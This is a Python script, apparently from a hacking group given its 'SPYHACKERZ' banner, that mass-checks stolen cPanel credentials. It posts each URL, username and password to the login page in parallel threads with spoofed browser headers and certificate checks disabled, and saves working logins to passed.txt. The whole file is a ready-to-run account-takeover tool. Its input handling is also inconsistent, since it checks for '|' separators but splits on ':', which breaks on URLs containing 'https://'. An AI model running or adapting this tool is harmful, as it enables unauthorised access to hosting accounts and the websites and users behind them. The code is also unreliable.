import sys
import os
import subprocess
import requests
from multiprocessing.dummy import Pool
import urllib3
import pyfiglet
from colorama import Fore, Style

def print_banner():
    try:
        banner = pyfiglet.figlet_format(" chleoz ~ SPYHACKERZ", font="big")
        print(Fore.GREEN + banner + Style.RESET_ALL)
    except Exception as e:
        print("Pyfiglet bulunamadı veya bir hata oluştu.")

urllib3.disable_warnings()

def check(txt):
    url, user, password = txt.split(':')  
    headers = {
      'Accept': '*/*',
      'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
      'Connection': 'keep-alive',
      'Origin': url,
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"'
    }
    params = {'login_only': '1'}
    data = {'user': user, 'pass': password} 
    try:
        response = requests.post(f'{url}', params=params, headers=headers, data=data, timeout=20, verify=False)
        if 'cpanel' in response.url:
            print(f'Valid: URL: {Fore.GREEN}{url}{Style.RESET_ALL} | Login: {Fore.GREEN}{user}{Style.RESET_ALL} | Password: {Fore.GREEN}{password}{Style.RESET_ALL}')
            with open('passed.txt', 'a') as f:
                f.write(f'{url} | {user} | {password}\n') 
        else:
            print(f'Invalid: URL: {Fore.RED}{url}{Style.RESET_ALL} | Login: {Fore.RED}{user}{Style.RESET_ALL} | Password: {Fore.RED}{password}{Style.RESET_ALL}')
    except requests.Timeout as err:
        print(f'{Fore.RED}{url}{Style.RESET_ALL} --> [Failed]')
    except requests.ConnectionError as err:
        print(f'{Fore.RED}{url}{Style.RESET_ALL} --> [Connection Refused]')
    except Exception as e:
        print(f'Hata oluştu: {e}')
        pass

def main():
    print_banner()  

    if os.path.basename(__file__) != 'chleozcheckerv2.py':
        print("Dosya adı chleozcheckerv2.py olmalıdır.")
        return

    if len(sys.argv) != 3:
        print("Hatalı Kullanım! Doğru Kullanım: python  chleozcheckerv2.py urllist thread")
        return

    file = sys.argv[1]  
    try:
        with open(file, 'r') as f:
            lines = f.readlines()
            for line in lines:
                if '|' not in line:
                    print("Dosyanın her satırında '|' karakteri ile ayrılmış URL, kullanıcı adı ve parola olmalıdır.")
                    return
            accounts_list = [line.strip() for line in lines]  
    except FileNotFoundError:
        print("Belirtilen dosya bulunamadı.")
        return
    
    thread = int(sys.argv[2])
    with Pool(thread) as mp:
        mp.map(check, accounts_list)

if __name__ == "__main__":
    main()
